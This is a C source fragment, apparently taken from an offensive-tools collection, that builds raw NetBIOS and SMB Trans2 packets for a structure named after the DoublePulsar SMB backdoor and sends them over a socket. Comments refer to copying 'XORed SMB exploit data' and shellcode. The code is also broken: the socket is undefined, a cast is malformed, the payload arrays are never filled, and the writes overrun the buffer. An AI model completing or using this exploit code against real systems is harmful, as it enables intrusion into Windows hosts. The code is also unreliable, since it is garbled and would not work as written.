//https://github.com/SofianeHamlaoui/Lockdoor-Framework/blob/master/ToolsResources/EXPLOITATION/Tools/trans2open.c

#pragma pack(1)
typedef struct {
	unsigned char type;
	unsigned char flags;
	unsigned short length;
} NETBIOS_HEADER;

typedef struct {
	unsigned char protocol[4];
	unsigned char command;
	unsigned short status;
	unsigned char reserved;
	unsigned char  flags;
	unsigned short flags2;
	unsigned char  pad[12];
	unsigned short tid;
	unsigned short pid;
	unsigned short uid;
	unsigned short mid;
} SMB_HEADER;

typedef struct {
  /* wct: word count */
  uint8_t wct;
  uint16_t total_param_cnt;
  uint16_t total_data_cnt;
  uint16_t max_param_cnt;
  uint16_t max_data_cnt;
  uint8_t max_setup_cnt;
  unsigned char reserved1;
  uint16_t flags;
  uint32_t timeout;
  uint16_t reserved2;
  uint16_t param_cnt;
  uint16_t param_offset;
  uint16_t data_cnt;
  uint16_t data_offset;
  uint8_t setup_count;
  uint8_t reserved3;
  uint16_t subcommand; //ADDED subcommand
  uint16_t bcc;
  uint8_t padding;
  //unsigned char[13];
  //unsigned char SMBDATA[4096];
} TRANS2_DOUBLEPULSAR;

#pragma pack(pop)


void main()
{
	char buffer[4000];

	NETBIOS_HEADER  *netbiosheader;
        SMB_HEADER      *smbheader;

	memset(buffer, 0x00, sizeof(buffer));

        netbiosheader   = (NETBIOS_HEADER *)buffer;
        smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));

	TRANS2_DOUBLEPULSAR *doublepulsar;
	doublepulsar	= (TRANS2_DOUBLEPULSAR)(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER));

	netbiosheader->type             = 0x00;         /* session message */
        netbiosheader->flags            = 0x00;		//original: 0x04;
        netbiosheader->length           = htons(4174);	//original: 2096

        smbheader->protocol[0]          = 0xFF;
        smbheader->protocol[1]          = 'S';
        smbheader->protocol[2]          = 'M';
        smbheader->protocol[3]          = 'B';
        smbheader->command              = 0x32;         /* SMBtrans2 */
	smbheader->tid			= 0x01;
        smbheader->uid                  = 100;
	
	
	//memset after NetBIOS header & SMB Header with 0x90 for 3000 bytes
	int MAX_SMB_LEN = 4204;
	int bytesLeftInBuffer = MAX_SMB_LEN;
	bytesLeftInBuffer -= sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER) + sizeof(TRANS2_DOUBLEPULSAR);

	//memset parameters
	memset(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER) + sizeof(TRANS2_DOUBLEPULSAR), 0x00, 12);

	//memset the next 4096 SMB data len
	memset(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER) + sizeof(TRANS2_DOUBLEPULSAR) + 12, 0x00, 4096);

	char param_data[13];
	//copy XORed parameter data
	memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER) + sizeof(TRANS2_DOUBLEPULSAR), param_data, sizeof(param_data) - 1);

	char SMB_DATA[4096];
	//copy XORed SMB exploit data
	memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER) + sizeof(TRANS2_DOUBLEPULSAR) , SMB_DATA, sizeof(SMB_DATA) - 1);

	//memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER), shellcode, strlen(shellcode)- 1);
	
	send(sock, buffer, sizeof(buffer)-1, 0);
}
